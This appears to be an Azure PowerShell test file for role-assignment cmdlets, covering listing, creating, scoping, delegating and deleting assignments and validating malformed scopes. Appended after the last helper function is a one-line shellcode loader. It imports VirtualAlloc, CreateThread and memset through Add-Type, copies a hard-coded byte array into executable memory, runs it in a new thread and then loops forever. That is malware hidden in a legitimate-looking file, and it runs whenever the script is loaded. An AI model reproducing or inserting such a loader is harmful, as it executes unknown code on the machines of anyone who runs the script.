














function Test-RaClassicAdmins
{
    
    $subscription = $(Get-AzContext).Subscription

    
    $classic =  Get-AzRoleAssignment -IncludeClassicAdministrators  | Where-Object { $_.Scope -ieq ('/subscriptions/' + $subscription[0].Id) -and $_.RoleDefinitionName -ieq 'ServiceAdministrator;AccountAdministrator' }

    
    Assert-NotNull $classic
    Assert-True { $classic.Length -ge 1 }
}


function Test-RaClassicAdminsWithScope
{
    
    $subscription = Get-AzSubscription

    
    $classic = Get-AzRoleAssignment -Scope ("/subscriptions/" + $subscription[0].Id) -IncludeClassicAdministrators | Where-Object { $_.Scope.ToLower().Contains("/subscriptions/" + $subscription[0].Id) -and $_.RoleDefinitionName -ieq 'ServiceAdministrator;AccountAdministrator' }

    
    Assert-NotNull $classic
    Assert-True { $classic.Length -ge 1 }

    
    $classic = Get-AzRoleAssignment -Scope ("/subscriptions/" + $subscription[1].Id) -IncludeClassicAdministrators | Where-Object { $_.Scope.ToLower().Contains("/subscriptions/" + $subscription[1].Id) -and $_.RoleDefinitionName -ieq 'ServiceAdministrator;AccountAdministrator' }

    
    Assert-NotNull $classic
    Assert-True { $classic.Length -ge 1 }
}


function Test-RaDeletedPrincipals
{
    $objectId = "6f58a770-c06e-4012-b9f9-e5479c03d43f"
    $assignment = Get-AzRoleAssignment -ObjectId $objectId
    Assert-NotNull $assignment
    Assert-NotNull $assignment.ObjectType
    Assert-AreEqual $assignment.ObjectType "Unknown"
    Assert-NotNull $assignment.ObjectId
    Assert-AreEqual $assignment.ObjectId $objectId
}


function Test-RaNegativeScenarios
{
    
    $subscription = $(Get-AzContext).Subscription

    
    $badOid = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'
    $badObjectResult = "Cannot find principal using the specified options"
    $assignments = Get-AzRoleAssignment -ObjectId $badOid
    Assert-AreEqual 0 $assignments.Count

    
    Assert-Throws { Get-AzRoleAssignment -ObjectId $badOid -ExpandPrincipalGroups } $badObjectResult

    
    $badUpn = 'nonexistent@provider.com'
    Assert-Throws { Get-AzRoleAssignment -UserPrincipalName $badUpn } $badObjectResult

    
    $badSpn = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb'
    Assert-Throws { Get-AzRoleAssignment -ServicePrincipalName $badSpn } $badObjectResult
}


function Test-RaDeleteByPSRoleAssignment
{
    
    $definitionName = 'Backup Contributor'
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    $scope = '/subscriptions/'+ $subscription[0].Id +'/resourceGroups/' + $resourceGroups[0].ResourceGroupName
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -Scope $scope `
                        -RoleAssignmentId c7acc224-7df3-461a-8640-85d7bd15b5da

    Remove-AzRoleAssignment $newAssignment

    
    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaByScope
{
    
    $definitionName = 'Automation Job Operator'
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    $scope = '/subscriptions/'+ $subscription[0].Id +'/resourceGroups/' + $resourceGroups[0].ResourceGroupName
    $assignmentScope = $scope +"/"
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -Scope $assignmentScope `
                        -RoleAssignmentId 54e1188f-65ba-4b58-9bc3-a252adedcc7b

    
    DeleteRoleAssignment $newAssignment

    
    Assert-NotNull $newAssignment
    Assert-AreEqual $definitionName $newAssignment.RoleDefinitionName
    Assert-AreEqual $scope $newAssignment.Scope
    Assert-AreEqual $users[0].DisplayName $newAssignment.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaById
{
    
    $definitionName = 'Reader'
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -First 1 -Wait
    $scope = '/subscriptions/'+ $subscription[0].Id +'/resourceGroups/' + $resourceGroups[0].ResourceGroupName
    $assignmentScope = $scope +"/"
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -Scope $assignmentScope `
                        -RoleAssignmentId 93cb604e-14dc-426b-834e-bf7bb3826cbc

    $assignments = Get-AzRoleAssignment -RoleDefinitionId "acdd72a7-3385-48ef-bd42-f606fba81ae7"
    Assert-NotNull $assignments
    Assert-True { $assignments.Length -ge 0 }

    
    DeleteRoleAssignment $newAssignment

    
    Assert-NotNull $newAssignment
    Assert-AreEqual $definitionName $newAssignment.RoleDefinitionName
    Assert-AreEqual $scope $newAssignment.Scope
    Assert-AreEqual $users[0].DisplayName $newAssignment.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaByResourceGroup
{
    
    $definitionName = 'Contributor'
    $users = Get-AzADUser | Select-Object -Last 1 -Wait
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."
    Assert-AreEqual 1 $resourceGroups.Count "No resource group found. Unable to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -ResourceGroupName $resourceGroups[0].ResourceGroupName `
                        -RoleAssignmentId 8748e3e7-2cc7-41a9-81ed-b704b6d328a5

    
    DeleteRoleAssignment $newAssignment

    
    Assert-NotNull $newAssignment
    Assert-AreEqual $definitionName $newAssignment.RoleDefinitionName
    Assert-AreEqual $users[0].DisplayName $newAssignment.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaByResource
{
    
    $definitionName = 'Virtual Machine User Login'
    $groups = Get-AzADGroup | Select-Object -Last 1 -Wait
    Assert-AreEqual 1 $groups.Count "There should be at least one group to run the test."
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    Assert-AreEqual 1 $resourceGroups.Count "No resource group found. Unable to run the test."
    $resource = Get-AzResource | Select-Object -Last 1 -Wait
    Assert-NotNull $resource "Cannot find any resource to continue test execution."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $groups[0].Id `
                        -RoleDefinitionName $definitionName `
                        -ResourceGroupName $resource.ResourceGroupName `
                        -ResourceType $resource.ResourceType `
                        -ResourceName $resource.Name `
                        -RoleAssignmentId db6e0231-1be9-4bcd-bf16-79de537439fe

    
    DeleteRoleAssignment $newAssignment

    
    Assert-NotNull $newAssignment
    Assert-AreEqual $definitionName $newAssignment.RoleDefinitionName
    Assert-AreEqual $groups[0].DisplayName $newAssignment.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaValidateInputParameters ($cmdName)
{
    
    $definitionName = 'Owner'
    $groups = Get-AzADGroup | Select-Object -Last 1 -Wait
    Assert-AreEqual 1 $groups.Count "There should be at least one group to run the test."
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    Assert-AreEqual 1 $resourceGroups.Count "No resource group found. Unable to run the test."
    $resource = Get-AzResource | Select-Object -Last 1 -Wait
    Assert-NotNull $resource "Cannot find any resource to continue test execution."

    
    
    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/Should be 'ResourceGroups'/any group name"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/Should be 'ResourceGroups'/any group name' should begin with '/subscriptions/<subid>/resourceGroups'."
    Assert-Throws { invoke-expression ($cmdName + " -Scope `"" + $scope  + "`" -ObjectId " + $groups[0].Id + " -RoleDefinitionName " + $definitionName) } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups' should have even number of parts."
    Assert-Throws { &$cmdName -Scope $scope -ObjectId $groups[0].Id -RoleDefinitionName $definitionName } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups' should have even number of parts."
    Assert-Throws { &$cmdName -Scope $scope -ObjectId $groups[0].Id -RoleDefinitionName $definitionName } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Should be 'Providers'/any provider name"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Should be 'Providers'/any provider name' should begin with '/subscriptions/<subid>/resourceGroups/<groupname>/providers'."
    Assert-Throws { &$cmdName -Scope $scope -ObjectId $groups[0].Id -RoleDefinitionName $definitionName } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Providers/providername"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Providers/providername' should have at least one pair of resource type and resource name. e.g. '/subscriptions/<subid>/resourceGroups/<groupname>/providers/<providername>/<resourcetype>/<resourcename>'."
    Assert-Throws { &$cmdName -Scope $scope -ObjectId $groups[0].Id -RoleDefinitionName $definitionName } $invalidScope

    
    Assert-AreEqual $resource.ResourceType "Microsoft.Web/sites"
    $subscription = $(Get-AzContext).Subscription
    
    $resource.ResourceType = "Microsoft.KeyVault/"
    $invalidResourceType = "Scope '/subscriptions/"+$subscription.Id+"/resourceGroups/"+$resource.ResourceGroupName+"/providers/Microsoft.KeyVault/"+$resource.Name+"' should have even number of parts."
    Assert-Throws { &$cmdName `
                        -ObjectId $groups[0].Id `
                        -RoleDefinitionName $definitionName `
                        -ResourceGroupName $resource.ResourceGroupName `
                        -ResourceType $resource.ResourceType `
                        -ResourceName $resource.Name } $invalidResourceType
}


function Test-RaByServicePrincipal
{
    
    $definitionName = 'Web Plan Contributor'
    $servicePrincipals = Get-AzADServicePrincipal | Select-Object -Last 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    $scope = '/subscriptions/'+ $subscription[0].Id
    Assert-AreEqual 1 $servicePrincipals.Count "No service principals found. Unable to run the test."

    
    $newAssignment1 = New-AzRoleAssignmentWithId `
                        -ServicePrincipalName $servicePrincipals[0].ServicePrincipalNames[0] `
                        -RoleDefinitionName $definitionName `
                        -Scope $scope `
                        -RoleAssignmentId 0272ecd2-580e-4560-a59e-fd9ed330ee31

    $definitionName = 'Contributor'
    
    $newAssignment2 = New-AzRoleAssignmentWithId `
                        -ApplicationId $servicePrincipals[0].ServicePrincipalNames[0] `
                        -RoleDefinitionName $definitionName `
                        -Scope $scope `
                        -RoleAssignmentId d953d793-bc25-49e9-818b-5ce68f3ff5ed

    $assignments = Get-AzRoleAssignment -ObjectId $newAssignment2.ObjectId
    Assert-NotNull $assignments

    
    DeleteRoleAssignment $newAssignment1

    
    DeleteRoleAssignment $newAssignment2

    
    Assert-NotNull $newAssignment2
    Assert-AreEqual $definitionName $newAssignment2.RoleDefinitionName
    Assert-AreEqual $scope $newAssignment2.Scope
    Assert-AreEqual $servicePrincipals[0].DisplayName $newAssignment2.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment1
    VerifyRoleAssignmentDeleted $newAssignment2
}


function Test-RaByUpn
{
    
    $definitionName = 'Virtual Machine Contributor'
    $users = Get-AzADUser | Select-Object -Last 1 -Wait
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."
    Assert-AreEqual 1 $resourceGroups.Count "No resource group found. Unable to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -SignInName $users[0].UserPrincipalName `
                        -RoleDefinitionName $definitionName `
                        -ResourceGroupName $resourceGroups[0].ResourceGroupName `
                        -RoleAssignmentId f8dac632-b879-42f9-b4ab-df2aab22a149

    
    DeleteRoleAssignment $newAssignment

    
    Assert-NotNull $newAssignment
    Assert-AreEqual $definitionName $newAssignment.RoleDefinitionName
    Assert-AreEqual $users[0].DisplayName $newAssignment.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaGetByUPNWithExpandPrincipalGroups
{
    
    $definitionName = 'Contributor'
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."
    Assert-AreEqual 1 $resourceGroups.Count "No resource group found. Unable to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -SignInName $users[0].UserPrincipalName `
                        -RoleDefinitionName $definitionName `
                        -ResourceGroupName $resourceGroups[0].ResourceGroupName `
                        -RoleAssignmentId 355f2d24-c0e6-43d2-89a7-027e51161d0b

    $assignments = Get-AzRoleAssignment -SignInName $users[0].UserPrincipalName -ExpandPrincipalGroups

    Assert-NotNull $assignments
    foreach ($assignment in $assignments){
        Assert-NotNull $assignment
        if(!($assignment.ObjectType -eq "User" -or $assignment.ObjectType -eq "Group")){
            Assert-Throws "Invalid object type received."
        }
    }
    
    DeleteRoleAssignment $newAssignment

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaUserPermissions
{
    param([string]$rgName, [string]$action)
    
    $rg = Get-AzResourceGroup
    $errorMsg = "User should have access to only 1 RG. Found: {0}" -f $rg.Count
    Assert-AreEqual 1 $rg.Count $errorMsg

    
    Assert-Throws{ New-AzResourceGroup -Name 'NewGroupFromTest' -Location 'WestUS'}
}


function Test-RaDeletionByScope
{
    
    $definitionName = 'Backup Operator'
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    $scope = '/subscriptions/'+ $subscription[0].Id +'/resourceGroups/' + $resourceGroups[0].ResourceGroupName
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -Scope $scope `
                        -RoleAssignmentId 238799bf-1593-45d7-a90d-f3edbceb3bc7
    $newAssignment.Scope = $scope.toUpper()

    
    DeleteRoleAssignment $newAssignment

    
    Assert-NotNull $newAssignment
    Assert-AreEqual $definitionName $newAssignment.RoleDefinitionName
    Assert-AreEqual $scope $newAssignment.Scope
    Assert-AreEqual $users[0].DisplayName $newAssignment.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaDeletionByScopeAtRootScope
{
    
    $definitionName = 'Billing Reader'
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    $scope = '/'
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -Scope $scope `
                        -RoleAssignmentId f3c560f8-afaa-4263-b1d7-e34e0ab49fc7
    $newAssignment.Scope = $scope.toUpper()

    
    DeleteRoleAssignment $newAssignment

    
    Assert-NotNull $newAssignment
    Assert-AreEqual $definitionName $newAssignment.RoleDefinitionName
    Assert-AreEqual $scope $newAssignment.Scope
    Assert-AreEqual $users[0].DisplayName $newAssignment.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaPropertiesValidation
{
    
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $scope = '/subscriptions/'+$subscription[0].Id
    $roleDef = Get-AzRoleDefinition -Name "User Access Administrator"
    $roleDef.Id = $null
    $roleDef.Name = "Custom Reader Properties Test"
    $roleDef.Actions.Add("Microsoft.ClassicCompute/virtualMachines/restart/action")
    $roleDef.Description = "Read, monitor and restart virtual machines"
    $roleDef.AssignableScopes[0] = "/subscriptions/4004a9fd-d58e-48dc-aeb2-4a4aec58606f"

    New-AzRoleDefinitionWithId -Role $roleDef -RoleDefinitionId ff9cd1ab-d763-486f-b253-51a816c92bbf
    $rd = Get-AzRoleDefinition -Name "Custom Reader Properties Test"

    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $roleDef.Name `
                        -Scope $scope `
                        -RoleAssignmentId 584d33a3-b14d-4eb4-863e-0df67b178389

    $assignments = Get-AzRoleAssignment -ObjectId $users[0].Id
    Assert-NotNull $assignments

    foreach ($assignment in $assignments){
        Assert-NotNull $assignment
        Assert-NotNull $assignment.RoleDefinitionName
        Assert-AreNotEqual $assignment.RoleDefinitionName ""
    }

    DeleteRoleAssignment $newAssignment

    Assert-NotNull $newAssignment
    Assert-AreEqual $roleDef.Name $newAssignment.RoleDefinitionName
    Assert-AreEqual $scope $newAssignment.Scope

    VerifyRoleAssignmentDeleted $newAssignment
    
    Remove-AzRoleDefinition -Id $rd.Id -Force
}


function Test-RaDelegation
{
    
    $definitionName = 'Automation Runbook Operator'
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait
    $scope = '/subscriptions/'+ $subscription[0].Id +'/resourceGroups/' + $resourceGroups[0].ResourceGroupName
    $assignmentScope = $scope +"/"
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."

    
    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -Scope $assignmentScope `
                        -AllowDelegation `
                        -RoleAssignmentId 4dae20f3-6f62-442f-ab84-3b5a6f89e51f

    
    Assert-NotNull $newAssignment
    Assert-AreEqual $definitionName $newAssignment.RoleDefinitionName
    Assert-AreEqual $scope $newAssignment.Scope
    Assert-AreEqual $users[0].DisplayName $newAssignment.DisplayName
    Assert-AreEqual $true $newAssignment.CanDelegate

    
    DeleteRoleAssignment $newAssignment

    VerifyRoleAssignmentDeleted $newAssignment
}


function Test-RaGetByScope
{
    
    $definitionName = 'Automation Operator'
    $users = Get-AzADUser | Select-Object -First 1 -Wait
    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 2 -Wait
    $scope1 = '/subscriptions/'+ $subscription[0].Id +'/resourceGroups/' + $resourceGroups[0].ResourceGroupName
    $scope2 = '/subscriptions/'+ $subscription[0].Id +'/resourceGroups/' + $resourceGroups[1].ResourceGroupName
    Assert-AreEqual 1 $users.Count "There should be at least one user to run the test."

    
    $newAssignment1 = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -Scope $scope1 `
                        -RoleAssignmentId 08fe91d5-b917-4d76-81d7-581ff5a99cab

    $newAssignment2 = New-AzRoleAssignmentWithId `
                        -ObjectId $users[0].Id `
                        -RoleDefinitionName $definitionName `
                        -Scope $scope2 `
                        -RoleAssignmentId fa1a4d3b-2cca-406b-8956-6b6b32377641

    $ras = Get-AzRoleAssignment -ObjectId $users[0].Id `
            -RoleDefinitionName $definitionName `
            -Scope $scope1

    foreach ($assignment in $ras){
        Assert-NotNull $assignment
        Assert-NotNull $assignment.Scope
        Assert-AreNotEqual $assignment.Scope $scope2
    }
    
    DeleteRoleAssignment $newAssignment1
    DeleteRoleAssignment $newAssignment2

    
    Assert-NotNull $newAssignment1
    Assert-AreEqual $definitionName $newAssignment1.RoleDefinitionName
    Assert-AreEqual $scope1 $newAssignment1.Scope
    Assert-AreEqual $users[0].DisplayName $newAssignment1.DisplayName

    VerifyRoleAssignmentDeleted $newAssignment1
}


function CreateRoleAssignment
{
    param([string]$roleAssignmentId, [string]$userId, [string]$definitionName, [string]$resourceGroupName)

    $newAssignment = New-AzRoleAssignmentWithId `
                        -ObjectId $userId `
                        -RoleDefinitionName $definitionName `
                        -ResourceGroupName $resourceGroupName `
                        -RoleAssignmentId $roleAssignmentId

    return $newAssignment
}


function DeleteRoleAssignment
{
    param([Parameter(Mandatory=$true)] [object] $roleAssignment)

    Remove-AzRoleAssignment -ObjectId $roleAssignment.ObjectId `
                               -Scope $roleAssignment.Scope `
                               -RoleDefinitionName $roleAssignment.RoleDefinitionName
}


function VerifyRoleAssignmentDeleted
{
    param([Parameter(Mandatory=$true)] [object] $roleAssignment)

    $deletedRoleAssignment = Get-AzRoleAssignment -ObjectId $roleAssignment.ObjectId `
                                                     -Scope $roleAssignment.Scope `
                                                     -RoleDefinitionName $roleAssignment.RoleDefinitionName  | where {$_.roleAssignmentId -eq $roleAssignment.roleAssignmentId}
    Assert-Null $deletedRoleAssignment
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xe1,0xcb,0xfb,0x9d,0xdb,0xd0,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x55,0x83,0xe8,0xfc,0x31,0x50,0x10,0x03,0x50,0x10,0x03,0x3e,0x07,0x75,0x41,0xc1,0xf8,0x86,0x25,0x4b,0x1d,0xb7,0x65,0x2f,0x55,0xe8,0x55,0x3b,0x3b,0x05,0x1e,0x69,0xa8,0x9e,0x52,0xa6,0xdf,0x17,0xd8,0x90,0xee,0xa8,0x70,0xe0,0x71,0x2b,0x8a,0x35,0x52,0x12,0x45,0x48,0x93,0x53,0xbb,0xa1,0xc1,0x0c,0xb0,0x14,0xf6,0x39,0x8c,0xa4,0x7d,0x71,0x01,0xad,0x62,0xc2,0x20,0x9c,0x34,0x58,0x7b,0x3e,0xb6,0x8d,0xf0,0x77,0xa0,0xd2,0x3c,0xc1,0x5b,0x20,0xcb,0xd0,0x8d,0x78,0x34,0x7e,0xf0,0xb4,0xc7,0x7e,0x34,0x72,0x37,0xf5,0x4c,0x80,0xca,0x0e,0x8b,0xfa,0x10,0x9a,0x08,0x5c,0xd3,0x3c,0xf5,0x5c,0x30,0xda,0x7e,0x52,0xfd,0xa8,0xd9,0x77,0x00,0x7c,0x52,0x83,0x89,0x83,0xb5,0x05,0xc9,0xa7,0x11,0x4d,0x8a,0xc6,0x00,0x2b,0x7d,0xf6,0x53,0x94,0x22,0x52,0x1f,0x39,0x37,0xef,0x42,0x56,0xa9,0x95,0x08,0xa6,0x5d,0x21,0x98,0xc8,0xf4,0x99,0x32,0x59,0x71,0x04,0xc4,0x9e,0xa8,0x79,0x11,0x33,0x01,0x29,0xf6,0xe7,0xcd,0xf7,0xae,0x7e,0xaa,0xf7,0x9a,0xd2,0xe7,0x6d,0x26,0x86,0x54,0x1a,0x6d,0x3d,0x5a,0xda,0x85,0x45,0x5a,0xda,0x55,0x99,0x11,0x99,0x6c,0xd6,0xc7,0x1d,0xdf,0x70,0x50,0x97,0x40,0x46,0xa1,0x72,0xf7,0x81,0x0e,0x15,0x08,0x0c,0xd0,0x61,0x5b,0x43,0x43,0x3d,0x0f,0x35,0x0b,0x2a,0xfa,0x97,0xf0,0x53,0xd0,0x7e,0x6c,0xa6,0x84,0x2d,0x23,0xe5,0x69,0x84,0xab,0x24,0x88,0x30,0x50,0xc8,0x41,0xc5,0x66,0x43,0x60,0x89,0x13,0x41,0x1c,0xe5,0x6e,0x3b,0x8b,0xfa,0x45,0x56,0x74,0x6d,0x65,0xb7,0x74,0x6d,0x0d,0xb7,0x74,0x2d,0xcd,0xe4,0x1c,0xf5,0x69,0x59,0x38,0xfa,0xa4,0xcd,0x91,0x56,0xcf,0x15,0x42,0x31,0xcf,0xf9,0x6d,0xc1,0x9c,0xaf,0x05,0xd3,0xb4,0xd9,0x34,0x2c,0x6d,0x5c,0x78,0xa7,0x40,0xd4,0x7e,0x49,0x99,0x6e,0x40,0x3c,0xf8,0x29,0x82,0xe0,0xea,0x43,0xfb,0xe0,0x15,0x20,0x61,0x6d,0x9f,0xae,0x0a,0xf4,0x2c,0x48,0xbe,0x82,0xb7,0xc7,0x6e,0x18,0x52,0x6a,0x19,0xbb,0xf5,0xf8,0x86,0x6d,0x66,0x92,0x25,0x72;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

